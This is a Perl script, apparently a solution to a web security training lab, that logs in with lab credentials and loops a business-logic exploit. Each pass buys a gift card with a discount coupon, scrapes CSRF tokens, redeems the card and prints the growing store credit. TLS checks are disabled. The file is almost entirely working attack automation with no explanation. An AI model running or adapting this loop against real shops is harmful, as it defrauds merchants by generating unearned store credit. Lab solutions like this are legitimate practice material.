#!/usr/bin/perl

use strict;
use warnings;
use v5.32;
use Time::HiRes qw( time );
use Getopt::Long qw(GetOptions);
use HTTP::CookieJar::LWP;
use LWP::UserAgent;

my ($url, $it);
Getopt::Long::GetOptions('url=s' => \$url,
                         'it=i'  => \$it)
    or die  "Error in command line arguments \n";

my ($username, $password, $coupon) = qw(wiener peter SIGNUP30) ;
our $ua = LWP::UserAgent->new(
    cookie_jar  => HTTP::CookieJar::LWP->new(),
    protocols_allowed   => ['http', 'https']
);
$ua->ssl_opts(verify_hostname => 0, SSL_verify_mode => 0x00);

sub login  {
    my ($response, $csrf);
    $response = $ua->get($url . '/login');
    die("[!] Login failed: " . $response->status_line) unless $response->is_success;
    $csrf = $1
        if $response->decoded_content =~ /<input required type="hidden" name="csrf" value="(\w+)">/ig;
    $response = $ua->post(
        $url . '/login',
        {
            'csrf' => $csrf,
                'username' => $username,
                'password' => $password
        }
    );
    die ("Login failed: " . $response->status_line . " | " . $response->decoded_content) unless $response->status_line =~ /302 found/i;
    say("successful login  as $username:$password");
}

sub add_card_to_cart {

    my $response = $ua->post(
        $url . '/cart',
        {
            'productId' => '2',
                'redir' => 'PRODUCT',
                'quantity' => '1'
        }
    );
     die("Adding gift card to cart failed: " . $response->status_line . "\n " . $response->decoded_content) unless $response->status_line =~ /302 found/i;
 }

sub apply_coupon {
    my  $response = $ua->get($url . '/cart');
    die ("Getting /cart failed: " . $response->status_line . "\n" . $response->decoded_content) unless $response->is_success;
    my $csrf = $1
        if $response->decoded_content =~ /<input required type="hidden" name="csrf" value="(\w+)">/ig;
    $response = $ua->post(
        $url . '/cart/coupon',
        {
            'csrf' => $csrf,
                'coupon' => $coupon
        }
    );
        die ("Applying coupon failed: " . $response->status_line . "\n" . $response->decoded_content) unless $response->status_line =~ /302 found/i;

}

sub buy_gift_card {
    my $response = $ua->get($url . '/cart');
    die ("Getting /cart failed: " . $response->status_line . "\n" . $response->decoded_content) unless $response->is_success;
    my $csrf = $1
        if $response->decoded_content =~ /<input required type="hidden" name="csrf" value="(\w+)">/ig;
     $response = $ua->post(
        $url . '/cart/checkout',
        {
            'csrf' => $csrf
        }
    );

    die ("Buying gift card failed: " . $response->status_line . " | " . $response->decoded_content) if $response->decoded_content !~ /order-confirmation\?order-confirmed=true/i 
        && $response->status_line !~ /303 see other/ig;
}
sub get_gift_code {
    my $response = $ua->get($url . '/cart/order-confirmation?order-confirmed=true');
    die ("Getting order confirmation failed: " . $response->status_line . "\n" . $response->decoded_content) unless $response->is_success;

    return $1 if ($response->decoded_content =~ /<td>(\w{10})<\/td>/);
}

sub use_gift_code {
    my $code = shift;
    my $response = $ua->get($url . "/my-account");
    my $csrf = $1
        if $response->decoded_content =~ /<input required type="hidden" name="csrf" value="(\w+)">/ig;
        $response = $ua->post(
        $url . '/gift-card',
        {
            'csrf' => $csrf,
            'gift-card' => $code
        }
    );
    die ("Using gift card failed: " . $response->status_line . "\n" . $response->decoded_content) unless $response->status_line =~ /302 found/i;
}

sub show_store_credit {
    my $response = $ua->get($url . "/my-account");
    die ("Getting /my-account failed: " . $response->status_line . "\n" . $response->decoded_content) unless $response->is_success;

    say "$1"if ($response->decoded_content =~ /(Store credit: \$\d+\.\d{2})/ig);
}
sub exploit {
    add_card_to_cart;
    apply_coupon;
    buy_gift_card;
    use_gift_code(get_gift_code);
    show_store_credit();
}
login;
exploit foreach ( 1 .. $it);

